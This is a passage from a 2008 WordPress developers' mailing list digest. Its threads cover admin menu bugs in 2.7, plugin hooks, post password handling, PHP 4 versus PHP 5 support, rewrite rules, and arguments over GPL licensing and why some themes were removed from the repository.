admin and upgrade the database.

This is my first reply on this list, so sorry in advance if I did it wrong.
Anyway, try using wp_enqueue_script() to load any of a number of different
scripts that can allow you to do something like this. You can read about the
function at: http://codex.wordpress.org/Function_Reference/wp_enqueue_script

Hope that helps.

It can tell the difference the same way it normally does for an HTTP 
connection by the host header otherwise shared hosting simply would not 
work.

I think the real problem that can come from trying to use an IP Address 
is when a shared server has multiple IP Addresses for different users.

In this scenario if you use the wrong IP address then the web server on 
the end of the connection won't have a matching host.

The other problems that have come up are servers which are configured to 
not allow to connect back to themselves.

I know that a lot of work has been done with Ajax on the admin pages, 
but are there facilities for "lightwieght Ajax" on the blog pages?
In this case my home page, - I want to have part of the page changing, 
without reloading the whole page.
I don't want the whole page (with all the menus,sidebar,posts) etc to 
reload each time because a small amount has changed, because it is too slow!
There doesn't seem to be too much info in the codex on this, can someone 
point me in the right direction?
Thanks
Chris.

Subject: [wp-hackers] hi all... a hack,
	a bug a suggestion and thus a big mail
Message-ID: <110ee9010812072226x1101ae16h5002f3c19abf2e9@mail.gmail.com>

A hack... (cool one)...

I found it very irritating to find the small button in the left
sidebar items (the one which expand em) so decided to make it
sleeker... This hack makes the users to have an option to enable
hover-triggered submenu expansion... uses the hoverIntent thing to
make it (absolutely) comfortable, tested and fixed wierd bugs with
fast clickers (as if it's an advertizement)... The option is made
available in the "screen options" section (which, as if forcing to
force the users to browse_happy(), does not work in IE6) in a sub
section called "Menu Comfort" It also enables the user to decide if
they want the menu expansion state remembered when the menu reloads
this will help people with smaller screen/poor resolution as they
won't have to scroll to select a menu item... options are saved using
setUserOption cookie operation... The only files changed are:
	wp-admin/includes/template.php
	wp-admin/js/common.js
Don't have any idea how
to commit to the svn... will i need any authorization etc? does trac
have a commit feature? i only know and like git so here's what i
did... This is a gitk diff output of my commit to 2.7RC1 and i've also
attatched the changed files here... so someone who can... please run
it (test and feedback) and commit it thanks! or you can help me
here... can i commit directly ('ny utility or somethin) to svn from a
git repo?

Working on...

In the click-to-expand mode the pics will lead to the $parent_file and
the text will expand it instead... this helps people struggle less to
reach their destination.. Most of the time, since no. of $parent_files
is less than $submenus...(natural rule of probability) your intent
wont be to go to the first submenu item. anyone who made this menu
thing can help... actually it took like 3 hrs to figure the working of
the menu out since i don't have access to internet, thus codex at my
home...

A bug (not in my hack... leave me out ;))...

-webkit-box-shadow sux in google chrome there'll be black corners
because it is rounded... I know that is chrome's bug! but its our
resp. to fix it.

Just a thought..

Looking at all the things that don't work in IE shouldn't we make the
browsehappy thing show up by default? currently its commented!! or
should we just rebilliously neglect ie users?

BTW...

Hello all...
I'm Shashi, new member in the list, 17 yr old from Bangalore, India
and have been hacking wp core for my new vision-come-true website
uncorkers.org for a few months and wordpress (...must say,
Matt sir, I'm a fan of all your dictatorship!..) like on top of best
pieces of codes i've come across in my life...Poetry;)..  So tell me
more about you hacker buddies...

Message-ID: <ee3949160812080415y6f5dce7frd3da209ab20b128c@mail.gmail.com>

I have a plugin that has a top-level menu and then several submenus.
It was working fine in all previous versions of Wordpress 2.7 and I
installed 2.7-RC1 and I just noticed now that when I click on a
submenu, I get "Cannot load tdomf_show_options_menu" instead of the
actual submenu page. I've done some digging around in core, and it
looks like the menu's parent is not correct and so it instead of
treating the submenu as a function, it tries it as a file. I'm not
really sure where it's going wrong figuring out the parent menu
though. Any suggestions?

I was thinking of exactly that.
Probably have to include sajax or jquery in the home page for it to 
work, i think - that's where I get a bit confused!

Subject: [wp-hackers] add_menu_page, icon, dynamic menu, css and plugin
Message-ID: <8810a71a0812080629i4e1c257eo1cff7e162b56b463@mail.gmail.com>

Hi there !

How to solve this ?

I am using a main menu (add_menu_page) in my plugin.
In add_menu_page parms, instead of the icon menu url, i put 'div' to manage
the icon thru css.
The css displaying the icon is this :

#adminmenu #toplevel_page_mailpress_mails div.wp-menu-image {
    background:transparent url(../images/menu.png) no-repeat scroll -1px
-33px;
}
#adminmenu #toplevel_page_mailpress_mails:hover div.wp-menu-image,
#adminmenu #toplevel_page_mailpress_mails.wp-has-current-submenu
div.wp-menu-image,
#adminmenu #toplevel_page_mailpress_mails.current div.wp-menu-image {
    background:transparent url(../images/menu.png) no-repeat scroll -1px
-1px;
}

I have also implemented roles and capabilities wp facilities in my plugin.

My main menu is now completely dynamic, meaning that the toplevel page can
be any of the pages available inside my plugin !

The issue i am facing right now is about displaying the icon of my main menu
(that shouldnot changed) (still with 'div' in add_menu_page).

Apparently, the only way to identify the right div is to rely on the
$hookname (get_plugin_page_hookname) ("#toplevel_page_mailpress_mails" in
css above).

The issue i am facing right now is

* do i have to declare all the pages available in my plugin in the css ?

* could it be possible to have a class such as .toplevel_plugin_(name of the
plugin)_menu_image instead of wp-menu-image ?

Thanks for your answers.

Hi,

In my plugin,

For a specific role (for example 'editor')

i allow them to access to the settings page of my plugin.

The menu displays properly

Main Menu : Settings
Sub Menu : my settings page (the only option available because WP do not
allow access to WordPress setting pages).

but when i click on the Sub Menu (my settings page),
   i have the following message : You do not have sufficient permissions to
access this page.
   set by the options-general.php ... ??? !!!

any explanations ?

Can you post the plugin hook code to build the menu?

I did something very similar recently, here's how I did it:
First, I set $this->_file in my class to the file for the main menu 
item, then I do this:

add_menu_page( __('Page Title'), __('Menu Title'), 'accessLevel', 
$this->_file, '', 'div');

...

public function adminCSS() {
    echo <<<CSS
    <style type="text/css">
        #toplevel_page_{$this->_file} .wp-menu-image {
            background:transparent url(images/menu.png) no-repeat scroll 
-1px -1px;
        }
    </style>
CSS;
}

...

add_action( "admin_print_scripts", array($this, 'adminCSS') );

That should take care of it.

Message-ID: <ab03dc280812081250p737dbd5fy531564d96046bd16@mail.gmail.com>

Hi all,

I need to add update a separate database table when I write a post so I use
add_action('save_post', ...) to get the data to save.
The problem is that I get two calls with different postID:s when I save the
post and I only want to create a database entry for the "real" (parent) post
but I don't know how to find that out.
Can anybody tell me how to get the correct postID or is there a better way
to link to the correct post from my database table?

Thanks!

Be careful though, of the autosave case. Until the post is autosaved
that first time, it has no ID. In which case, the $_POST['post_ID'];
will not be set.

Message-ID: <af352e280812081449r5f1b87f8x439e9481edf0ea@mail.gmail.com>

The current table design wordpress uses for links/bookmarks limits the
length of the description to 255 characters.  The field type used is
varchar(255).  This can be very restrictive and in our case we really need
more space available for that field.  I propose changing the field type to
varchar(0) or some other type that will allow much longer descriptions.

We could just modify the code or our database for ourselves, but this could
cause problems if try to restore a backup on a new unmodified installation.
Also, I don't think space limitations these days really require us to limit
descriptions to only 255 characters.  Storage is cheap right?

I have no problem submitting a ticket and patch but I'd like to know what
other people think and what field type would be recommended.

Thanks,
Jared

to all and Claudio

the best is to download the two plugins i am speaking of here :

http://andrerenaut.ovh.org/wp/wp-content/UserFiles/download.php?path=plugins/&fname=mailpress_wph.rar

so the test case si th e following :

Activate plugins mailpress and mailpress_roles_and_capabilities.

Go to Settings > MailPress settings > R&C and allow say :  editor to access
MailPress settings.

then login with an editor profile, and you will see the setting menu with a
submenu MailPress settings

Click on the submenu link and you get : You do not have sufficient
permissions to access this page.

mySQL < 5.0.3 does not support varchar's longer than 255.
You'd have to change datatypes for what you're proposing.

Okay thanks, good to know.  So how about if it was changed to type text(0)
similar to the content of a post/page?

Indeed. You know, there are many databases that simply don't get
upgraded. I find myself visiting the upgrade page of the HPUG (Houston
Palm Users Group) every now and then to initiate the upgrade for
them. ;)

@ Eric Marden and to all

Role and capabilities are working great in my plugin, so the issue is not
there.

The issue is introduced by the new 2.7 menu organisation.

In a submenu associated with a WP existing main menu.
    * The access to the submenu is ok for a specific role
    * The access of the main menu file (*.php) is ko for that role

The Main menu and its submenu is displayed.

Clicking on the submenu retrieves the following message

You do not have sufficient permissions to access this page

set by the main menu file (*.php) ... because the test 'current_user_can' is
made BEFORE the call to the plugin page ....


I believe this is a bug !!!

Just had this problem from a user. They apparently entered a space
into the password field, but hadn't realised they had done so. They
couldn't then figure out why their post came up as password protected.

Shouldn't it be 'trimmed'  to remove spaces?

I am not sure if it should.  People are starting to be trained to use
pass phrases instead of pass words.  Pass phrases could include
spaces, and I have indeed seen users place spaces before and after
because they think it makes it harder to guess.  Perhaps adding a
password length counter would be beneficial so that you could see the
total number of characters entered.

Having a minimum password length would fix this easiest - have the minimum
set at 3-4 perhaps?We can include the strength counter from the profile page
as well.

I was just writing about the "Password Strength" meter, and you come
along and mention it before I could get it out.

Thinking about that, I don't have the latest version (I'm not sure
what version I have, is there any way of easily telling from the admin
section?), so it might have changed, but how about rejecting a zero
length password for users? Or at the least making it really obvious (a
red box instead of a grey box).

As for minimum length (for both user and post passwords), I'm not sure
that would be a good idea. (Unless it is linked to some more general
"security hand holding" setting, which could enforce a length for
passwords generally, and make other security requirements. That maybe
something worth exploring for someone with lots of time.)

What if someone wants a simple password on a post?

Not so sure on that, I personally don't like leading, or trailing,
spaces in pass phrases. The counter could possibly be added by a
plugin, as could a strength meter (which may not be that useful).

But it should be fairly easy to trim and then check  the length of the
password - at least that would catch a single space entered,
presumably in error.

That Role Manager plugin is great. Would there be traction for adding 
its functionality to core in the future? It seems to me that anyone 
with several users needs the capabilities of Role Manager, or 
something like it, and core currently offers basically nothing.

Getting Pie-in-the-sky here, but if RM can't be integrated into core,
which I think is reasonable since it's overhead that most people don't
need, it would be great if it was treated as a kind of crucial plugin
that will be stewarded by Automattic if the great im-web-gefunden guy
ever falls behind (rather than waiting months as we did the last time
it was abandoned). The cap system implies the plugin, and people who
use it depend on it, just like people depend on Akismet.

Well I agree about not having a minimum length - I have very short ones on
many posts/pages, but it would certainly be a way of stopping a password
containing JUST a space character.

I'm receiving a ton of feedback from people trying to download my plugins at
wordpress.org and are getting 404s on the download link. This appears to be
the case for all plugins on the site right now. Is there any news I can tell
these people as to when the links will be available again?

Message-ID: <349fe48b0812100312s2be81cf5g4c28b51cb254e014@mail.gmail.com>

I need a way to do something like media_send_to_editor() does:

When the user clicks "Insert into post", call a javascript function
that will do something on the post editing screen with the data
submitted in the form.

I'm trying to get my head around the filters in
wp-admin/includes/media.php and the like, but I haven't gotten too
far:

add_filter('image_send_to_editor', 'function_that_filters_the_text');

Any ideas?

Message-ID: <37fed22b0812100628q68c9dc06q92611e0280acc1bd@mail.gmail.com>

Hi, y'all.

Helgi from Iceland. I'm new on the list, and a new user of WordPress. I was
a professional PHP programmer from early 2000 (back in version 3.x) until
late 2006, and I've been maintaining some of my own projects since. At the
risk of getting accused of spamming, you can see my code at
http://code.google.com/p/mijob - it's one of those "todo-list on steroid"
apps. Just download and point your browser to it. Believe it or not, it
should actually be even easier to set up than WordPress, at least on most
PHP configurations. I've also written about a dozen CMSes at various points
for various different purposes, but they're all proprietary.

I was looking through WordPress's code and I'd like to do some code
cleaning, specifically for the purpose of speeding things up. It's ranked as
number 2 on the "Ideas" list and a lot of people seem to desperately want
it.

However, someone who sounded like a WordPress developer said that the
problem was the underlying design of the app itself, in other words that it
would require some radical changes of the "framework" (for lack of a better
word) to speed it up. Assuming he/she was correct, that's exactly what I'd
like to do. First of all simplify the code and remove unnecessary
complications which will then make optimizations easier, or preferably, a
piece of cake. For example, on the front page, even with a big theme, I find
it impossible to imagine that 3.3 seconds are required to load a single
page, which is the average time it takes to render on my 2GHz/3.5GB
computer. PHP and MySQL are both so fast that there just *must* be some
unnecessary bottlenecks around, there's just not enough functionality to
account for so much sluggishness. Still, I am aware that WordPress is a very
feature-rich app.

But as we all know, some developers can take changes to their code somewhat
personally, not to mention that I might anger someone by radical changes
that contradict what people are used to. So I figured I should introduce
myself and "warn" you all, although of course I won't submit anything unless
some of the senior developers have given me a go on it (not to mention that
first I need write access to the Subversion repository).

A couple of questions:

1. Is someone actually *against* a major code cleanup?
2. Has someone tried this before or is someone already working on it?
3. Is it okay to use PHP 5.x code?

Peace.

Alright, thanks for the response. I'll stick to 4.3 features then.

Are there any plans for changing that? PHP 5 not only contains things useful
for developers, but a few things that can drastically help with
optimization, most notably the __autoload() function, which can be used to
load only classes which are necessary when they are needed, as opposed to
loading all of them, even if 99% of them are never used during the execution
of the page.

Furthermore and perhaps more importantly, PHP 4.x development has been
discontinued altogether. Personally, I find this to be enough of a reason to
seriously contemplate going for PHP 5.

I don't like to nag, these are just points for consideration. I do
understand the points for sticking to PHP 4.x as per the reference you gave.

Peace.

I fully agree with you Helgi. I much prefer developing for PHP 5 rather 
than PHP 4, and I definitely prefer developing for PHP 5 rather than 
both PHP 4 and PHP 5. That said, even I agree that it burdens too many 
end users of the software if it only supported PHP 5 as there are many, 
many hosts that still only offer PHP 4 and many more hosts that only 
support PHP 5 if you know how to switch to it or request for it.

Supporting both PHP 4 and PHP 5 is the most reasonable course of action 
to take as it 1) drastically reduces the amount of frustration of end 
users, 2) removes the need to support people who don't know why their 
WordPress install isn't working due to running PHP 4, and 3) makes it 
easier for an IT novice to get up and running with WordPress. Sure, 
supporting only PHP 5 would make it easier on the developers, but it 
would do so at the cost of the end users. I don't think it's a stretch 
to assume that the number of end users outweighs the number of 
developers (themers and plugin devs included). In the end, everything we 
do with WordPress is to make it easier for the end user, and that's the 
benchmark by which all such decisions should be weighed.

Logically it would follow on from a quorum of hosting providers getting 
their houses into order and replacing some of the antiquated platforms.

Of course that seems like a really slow process.  One provider that I 
use is only now introducing PHP 5 servers, and the bulk of the platform 
has just been upgraded to 4.4.9.

I think that there is an issue because the web host providers have to 
support the old apps, and the old apps can't move forward because the 
hosting doesn't give them PHP5..

Thanks for the article, but I still think upgrading to PHP 5 is proper. The
arguments for sticking to PHP 4 seem severely overblown to me, particularly
the notion that upgrading either apps or PHP installations to PHP 5 is
somehow difficult. It's not. It's not too much to ask of ISPs to upgrade at
*some* point. Especially now that the PHP team has even stopped issuing new
*security fixes*, that really settles it in my mind.

Now, I don't want to turn this into a version war, especially because I'm
new. I think I know what to do instead.

Really, the one thing I want from PHP 5 to speed up WordPress is the
__autoload() function, which can be written without breaking PHP 4
compliance, it just won't work. So I'll check for PHP's version, and if it's
<5, I'll load all the classes (with the accompanying, unnecessary slowdown
of parsing massive amounts of code), but if it's 5+, I'll use the
__autoload() function. This should give PHP 5 users the benefit of the
__autoload() function while still retaining PHP 4 compatibility.

That said, put me on the list that supports upgrading to 5.x. There are real
benefits to PHP 5, it's not just some childish "newest is best" attitude. I
could have agreed back when PHP 4 was actually still in development, but it
isn't. It's outdated, obsolete, deprecated, gone. It's a certain security
threat in the long run. These backwards-compliance arguments are always used
against upgrading anything and they're valid for a while, but surely
upgrading becomes proper at *some* point. It's not exactly radical to
upgrade from a product that's not even maintained anymore. If upgrading now
is not proper, I wonder when.

I consider the issue settled though, and I won't bother y'all more with
this. Thanks for the responses and don't take any of this personally. :) I
mean no disrespect to anyone, and I'll keep my changes 4.3-compliant for
now.

Peace.

I figured that the best way is to do it all with jQuery, by
manipulating the contents of the iframe.

A related issue: I'm using the latest nightly and when I try to insert
an image in a post, I can only insert it at full size (the radio
inputs are all disabled). Why is that?

Certainly nobody is against increasing the efficiency of the code.   
The thing to be careful of is changing the _output_ of a lot of  
functions that people are accessing via plugin.  Plugin developers get  
annoyed (at best) when arbitrary changes are made to the output and/or  
parameters of existing functions.  If your efficiencies end up  
eliminating functions you might even go so far as writing "shell"  
functions replacing the removed functions -- that is, they aren't used  
by the new code except to the extent that some plugin or other might  
use them.  (If you do that, of course, mark the functions as  
"deprecated" so developers are more likely to notice they're using old  
calls....)

There have also been cases when new code actually changed the  
parameters and such of existing functions -- which just causes  
problems.  If you're really changing they way a function works, make a  
new function with a new name, and somehow work in backwards  
compatibility for the old function.

You may know all this -- sorry if I'm making bad assumptions -- but  
these things have happened, and I'd rather cut them off _before_  
they're coded then chase after behind them.

Overall, it sounds like a worthwhile project. :)

Regards,
Stephen

Message-ID: <db047a770812110435n16a966b3tcb803947d34b8061@mail.gmail.com>

Hello,

i have write a plugin, since version 1.5 of WordPress.
I use two hooks in one file.

add_submenu_page('index.php', __('FeedStats', 'feedstats'),
__('FeedStats', 'feedstats'), get_option('fs_user_level'), __FILE__,
'feedstats_display_stats');
add_options_page(__('Settings FeedStats', 'feedstats'),
__('FeedStats', 'feedstats'), 9, __FILE__,
'feedstats_admin_option_page');

When i use the page on the dashbaord-menu, than is also aktive the
menu-point for options.

It is possible to change this. How is the function for the effekt on
the menu to oben the options or other menu-points.

Thanks!

Email me privately tho, to prevent mailing list cruft. Everyone is trying to

Does anyone have experience making Firefox add-ons? Could something like
this be possible?

Whenever an email notification is received about a new comment, you can
somehow manage that comment from right within Gmail.  Making use of
the new comments
API <http://trac.wordpress.org/ticket/7446>, you wouldn't have to click
through to the admin to perform those tasks.

What do you think?

Maybe it's just me but I don't really get the point of such an
extension. Basically, you would... use Firefox (extension) to manage
comments instead of... using Firefox (wp-admin page) to manage
comments?
(BTW: There are already a few desktop apps to do so (example:

Right. Except you wouldn't have to go to the admin page to do so.  You could
moderate and reply to comments from within Gmail once you get the
notification.  I'm not that familiar with GreaseMonkey but maybe it's
possible.

I hate using the Wordpress Admin, and I agree with Trevor. For me and  
my workflow, it would be easier, faster, and more convenient to be  
able to moderate, and blacklist, from my email, without leaving my  
email.

I agree to, but how is this a Firefox add-in?

Seems more like a tweak to the E-mail Notification e-mail that will
allow you to do those functions.

Again, I agree, but I am not sure how this is a Firefox add-in as you
described. It would be cool if all your comments did come
to a Firefox addin (like TwitterFox for Twitter) and you can manage
them that way. But, that isn't dependent on Gmail.

(And apologies if I've missed obvious stuff; -hackers has taken a back 
seat the last few months.)

2 aspects:

* I want my lowest permed members to have post access on all blogs i.e. 
throughout the system / for all sub-domains. (I haven't figured out how 
to make members blogs distinct ... maybe just point them to WP.com *grin*)

* I /don't/ want inexperienced members being blown away by the full 
Admin menu.

Anybody working on making Admin presentation conditional on role?

Subject: [wp-hackers] Permalink problems
Message-ID: <4941FAD2.3010704@yahoo.com>

I've recently moved my site to WordPress, mainly to take advantage of 
the "friendly urls" format.

My new sitemap looks pretty good, but none of the new urls have appeared 
in Google, so I can't measure the success of my transition from one blog 
format to another.

However, I have noticed that the Web Crawl in Google Webmaster Tools 
returns thousands of 404 errors.

Here's the concern: Many of those 404 errors are urls that append 
WordPress default urls (?p=) to WordPress-friendly urls.

Those urls appear in this format:
http://www.mysite.com/2006/07/12/here-is-my-story/?p=18

I would expect the WordPress permalink structure to prevent these sorts 
of errors. Is there anything I can do on my end to prevent them?

Thanks.

within them. I've reported on the issue based on what I've been able to 
find out http://www.jeffro2pt0.com/why-were-200-wordpress-themes-removed 
Justin Tadlock and the original topic start Spectacu.la have all 
discussed the issue. Since there is no WP-Theme mailing list, I figured 
this would be the best place to get an official response from either 
Matt or a higher up explaining why the themes were removed. All points 
aside, it's my opinion that a lack of a public statement regarding the 
removal of those themes was a bone headed move and a good way to lose 
trust even if it was for a good purpose.

Message-ID: <49420F70.5090903@yahoo.com>

Do I still need my index.php Redirect for WordPress? It's in my 
.htaccess as a holdover from my old blog format, which generated links 
preceded by index.php.

# Redirect index.php to /
RewriteCond %{THE_REQUEST} \ /(.+/)?index\.php(\?.*)?\  [NC]
RewriteRule ^(.+/)?index\.php$ http://www.turetzkysyndrome.com/%1 [R=301,L]

Also, I'm wondering, what is the index.php for in the WordPress 
permalinks rewrite, and is that necessary?

# WordPress permalinks
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

Thanks.

Absolutely necessary. It redirects a request for any file or directory
that doesn't exist to index.php, where it's then handled within WordPress.

There's an update to Spectacu.la's post saying that they've been contacted
by Matt.  We'll see what the resolution is, but it may end up not being as
big of an issue as you might think.

What permission issues are you running into?

If this is a new repository, it may not have been completely set up yet. 
It's a common problem to get an error like the following when the 
repository is not fully set up yet:

Error: Commit failed (details follow):
Error: CHECKOUT of '/!svn/ver/52171/plugin/trunk': 403 Forbidden 
(http://svn.wp-plugins.org)

If this is similar to your problem, you can see details about what I 
encountered here

I'm getting the 403s, but it's not a new plugin.  It's for WPhone, the
plugin Viper, Stephane and I worked on.  Last rev went in almost a year ago
and I'm trying to commit in to the dev branch (not the trunk).

Message-ID: <79905c73-0079-4305-874c-4fb995ef15f6@r10g2000prf.googlegroups.com>

I am running into an issue which I first saw with 2.6.5.  I do most of
my development using VMware on my lpatop.  I have virtual machines
configured for Linux, Vista, and XP and tend to do most of my work in
the XP environment and then validate it with Vista and Linux.

I am setting up a new development VM for some theme work I want to do
and want to install a clean WordPress installation using IIS, MySQL
5.x and PHP5.x.  When I run the WordPress installer, I get the
"Welcome to the famous 5 minute installer ..." message and I fill in
the dialog boxes and click the "Install WordPress" button (which if
you hover on it shows "install.php?step=2".  I would expect the URL to
be "wp-admin/install.php?step=2".  Well, it fails in both 2.6.5 and
2.7 but works with 2.6.3.

The only way I have been able to install a clean version of WordPress
is to install 2.6.3 first and then upgrade to either 2.6.5 or 2.7.
Seems like a bug to me but wanted to find out if maybe it was unique
to running it under Windows.  Anyone else run into this?

Honestly, I don't think they should have themes in there that link
back to a theme author's site if ANY of the themes that author has are
non-GPL. Why should WordPress promote anybody who violates the
WordPress license?

A theme that is not GPL is in violation of the WordPress license.
Period. It is not possible to create a non-GPL-compatible theme and
remain legal.

No, it's possible in theory to make a plugin that does not integrate
tightly enough to be a derivative work. Because the only thing that a
plugin has to do to be included is to have some special comments at
the top of it. Admittedly, a plugin of any substance has to make calls
into deeper WP functions, and so then has to be GPL-compatible as
well.

Themes, on the other hand, *have* to make direct calls into WordPress
code, making them derivative works. They have no other choice. And so
they must therefore be GPL compatible. Since WordPress is GPL and not
LGPL, they don't get to choose otherwise.

Is this really true?  ALL themes and essentially ALL plugins have to
be freely-distributable software?

If so, I think this should be announced a little more loudly on the
Codex pages (http://codex.wordpress.org/Writing_a_Plugin and
http://codex.wordpress.org/Theme_Development).

To follow up on this - if I enter the site as http://localhost/  I get
the behavior described above, if I enter the site as http://localhost/wp-admin/
then the initializion process proceeds correctly and the new blog is
created.

No, they have to be GPL compatible. which is not quite the same thing.

You can still sell GPL'd code. You just can't stop those you sell it
to from selling it (or giving it away) too.

Not everybody agrees with me on this, however a) they're wrong and b)
the only people who could legally prevent anybody from doing it is the
copyright holders of WordPress itself. And Matt et al have been
noticeably silent on the issue in the past.

My take on this is that they would rather make themes and plugins free
by using honey instead of by applying the big stick. Notice the
creation of the Extend section for Plugins and Themes in the last
year, as well as its integration into the WordPress core itself, with
automatic updating (but only if you happen to put your plugin/theme on
wordpress.org, which means that it must be GPL compatible...).

By offering additional functionality to free plugins which is not
available to non-free ones, you increase the number of free ones and
slowly drive the non-free ones out of business. With the new theme
updating and child theme support in 2.7, there's a good chance the
same sort of thing will start happening for themes.

If the issue really is trivial or something I blew out of proportion, 
I'll be pretty happy and gladly write an apology. I still don't 
understand though why a public statement hasn't been made. My only guess 
is, that the people behind the scenes may not think that the issue or 
problem is a big deal and therefor, doesn't really need to be mentioned.

Slightly off-topic, but a little aside

The most awesome part of the WordPress copyright situation: that the
copyright holders are us -- each and every one of us that has
contributed code to WordPress. If Matt grew two horns and wanted to make
WordPress proprietary, he would have to get written permission from
every single person who has ever contributed code _ever_ to WordPress.
(Good luck with that. :-D)

Depends on the use case. For a open source project like WP, it's
basically a "collective work", or a "compilation" under copyright law.

The individual patches are copyrighted by their authors, and are
derivative works of the WP project. But when you put them together
with the original work, then it becomes a compilation. And under US
copyright law, the person creating a compilation has copyright in the
organization of the material (plus any material he contributed, of
course).

This seems odd at first, but think of it this way: the act of putting
the two things together (old version + patch = new version) creates a
new derivative work with a separate copyright.

So while nobody could make WP proprietary, the copyright of the
project for the purposes of licensing litigation does rest with
whoever is the person or group committing the patches into the
project.

So to get this straight, it is perfectly acceptable for someone to sell 
a wordpress theme and make a business out of it but it is not acceptable 
to state that the work, or the links within the work can not be modified 
and redistributed? How many different ways can a theme author violate 
the GPL while trying to make a business out of it? I bet Brian Gardner 
is happy with his decision to bypass the GPL mess and just base his 
business model through support packages and what have you.

Remember that all of this has never been tested in court and probably  
WILL not be tested in court. The premium theme space created one of  
the first ways for developers to make REAL money with WordPress. As a  
plugin author, I know that there is hardly ANY money in developing  
open source plugins. With almost 25 plugins in the repository myself,  
I get a max of about $100 a month in donations. That wouldn't be  
enough to maintain those plugins if I did it for the money (I don't,  
let's get that straight, although I appreciate the donations and they  
do help).

Brian Gardner's new model is probably better, but I doubt it'll make  
him as much money.  In my opinion, it would be cool if the WordPress  
community and / or Automattic could make a method in which plugin  
authors could earn a bit more money writing open source plugins. That  
would probably help people keeping up longer, but I know from  
experience how hard that is.

I've been a committer in Apple's WebKit project since the very  
beginning of the project, and the Macbook Pro I'm typing this message  
on was  a gift from Apple, almost 3 years ago. Automattic is even  
better to its core contributors, it usually hires them it seems ;)

What I'm really trying to say, I think, is that it'd be good if it  
were easier to actually make MONEY with WordPress, but on the other  
hand, that goes for just about anything on the internet :)

(to clarify: I myself make enough money doing other things, so I  
wouldn't need the money, I'm just saying this because I think it'd  
help the progress of WordPress as a community. The premium themes, our  
prime example, have really pushed theme development forward IMHO.)

Best,
Joost

The GPL doesn't matter until someone gets sued.

If Otto wanted to be extreme about it, he could buy some "Non-GPL"
plugins/themes, then post them on his site for free and claim that
they are GPL because they use wordpress code. Then if the original
author sued him the courts would make a decision about how the GPL
applies in this case. Of course it seems that the value of a WP
plugin/theme is almost definitely less than the cost of any kind of
copyright trial, so the author might just let it go (and depend on
their brand/support) or Otto might take them down before it got that
far (or maybe he'd get Eben Moglen from FSF to represent him, which is
possible).

The cost of finding out these things is so prohibitive that the GPL
usually works as a preventative measure and a social contract rather
than a practical contract used to determine court outcomes (though
it's designed to do so if necessary). As you can imagine, courts
aren't very well informed about this stuff though, so it's
particularly slow and complicated to come to a decision.

Another interesting thing to note is that FSF as a whole practices a
very polite form of litigation when it comes to these things. They
never ask for damages, just compliance. So it's not that risky to
release "Non GPL" code because if FSF pressures you all you have to do
is admit your code is GPL and Free and then you are fine.

Hm... you might want to ask Verizon Communications their opinion of that
claim. ;-)

http://www.softwarefreedom.org/news/2008/mar/17/busybox-verizon/

I think we are to the point in history where developers, like the BusyBox
developers, are frustrated with a lack of respect for what "free" means. In
this case, Verizon took BusyBox code and used it (which is groovy) added
their own improvements and sold it (which is groovy) but refused to release
their work, in kind (which is uncool.)

The Software Freedom Law Center (not the FSF) approached them but were
ignored.

http://www.softwarefreedom.org/news/2008/jul/21/busybox/

That did not bode well with the BusyBox developers and Eben and company were
able to convince Verizon to reconsider their approach.

It is worth pointing out that hostile comments on a forum on behalf of
Verizon exposed an attitude that was clearly lack of respect for developers
intentions and the GPL.

It is also worth pointing out that *any* copyright holder of GPL'ed work can
call upon the resources of the SFLC to help protect their rights.

I don't understand this policy of removing theme of a author who only shows
ads of a premium theme. How does GPL violates in this case. Please refer to
http://www.jeffro2pt0.com/why-were-200-wordpress-themes-removed#comment-2952-
Adii's comment here on what I mean. A person whos releases a GPL theme
but
only uses a affiliate banner of a premium theme site - Does this also
violates GPL in a way?

No, the paid links thing is a completely different issue from GPL.
It's a policy for inclusion in wordpress.org/extend (as i understand
it) because they want to keep quality high and avoid exploiters just
looking to make money by re-releasing existing themes with paid links.

You can be as commercial as you want with GPL code as long as you keep
the license attatched to your product. GPL-compliance and "no paid
links" are just two seperate qualifications to be in the theme/plugin
repositories.

But if you read Adii's comment...the author whose theme has been removed
didn't inserted affiliate links in theme. Only on his site. What does
wordpress want? Don't want them to make money?

Ola peeps

For those interested, I updated my "WordPress Functions Implementation
History Tool" (what a mouthful) to find out when a particular function
was introduced or removed.
Now covering 2400 functions, 5 years and 45 versions from 0.7.1 to 2.7!
<http://planetozh.com/blog/my-projects/wordpress-functions-implementation-history-tool/>

Ha ha, wow! You totally found some news from yesterday to prove me wrong!

"Brett Smith, licensing compliance engineer at the FSF, said the FSF
wants Cisco to comply with all relevant free software licenses in all
their products. In addition, it asks that Cisco appoint a Free
Software Compliance Officer responsible for ensuring Cisco's
compliance with these licenses going forward."

I think this is the important part to look at. It's not explicit in
the article, nor in the FSF press release
(http://www.fsf.org/news/2008-12-cisco-suit), but I think they are
practicing what I was describing. The damages and injuction are the
threat if they DONT start complying. They are almost definitely trying
to settle this outside of an actual trial.

Yea, totally off-topic. It came upon the NOLUG list this morning. And  
the asking for profits was in the brief. I agree that it's probably a  
"threat" made larger by journalists-need-page-views.

Pete's situation as per the comment reference in Najots reply is very 
interesting. What happened to Pete (if thats how it happened) is I think 
out of line. In relation to the linking issue, here is the actual 
statement as part of the requirements to be hosted on the repository.

No hidden, paid or sponsored links in the theme. Links back to the 
author's site are fine.

What if the authors site happens to be a site that sells themes? I mean, 
it's not paid, it's just that the theme author is releasing a decent 
product for free to be used by anyone and the authors site just happens 
to be a guy running his own pay-for-theme company? Wouldn't he be 
considered the theme author in which case, fall in line with the 
requirements?

One more point..take Linux.. What Redhat does is the same done by the author
whose theme got removed for showing Woothemes.com ads on his site! If We are
to go by Automattic, Redhat violates GPL or does vice versa is true?

Well there's the rub Jeffro. They modified their terms of putting themes 
on the repository. If you check their terms, they added the following at 
the bottom:

    All themes are subject to review. Themes for sites that support
    "premium" (non-GPL or compatible) themes will not be approved.

I'm with you. If they wanted to do this, that's fine. Why did they do it 
so quietly, slip this bit of text in the terms, and then kick a bunch of 
people off of the repository? This wasn't just a "we're catching up on 
some overdue cleanup," this is a calculated attack against "premium" 
theme producers which has also involved innocent themers that play by 
the rules but didn't match with the politics at Automattic.

I'm all for Automattic doing whatever they want, but I want to know why 
they do it quietly. If they are truly doing it for the benefit of the 
community, shouldn't they get the community involved?

In closing, I have to share that this move by Automattic has me 
wondering about the future of my involvement with the community. Full 
disclosure, I work for iThemes, which you would know if you visit my 
blog. I have previously released three plugins on the repository, two of 
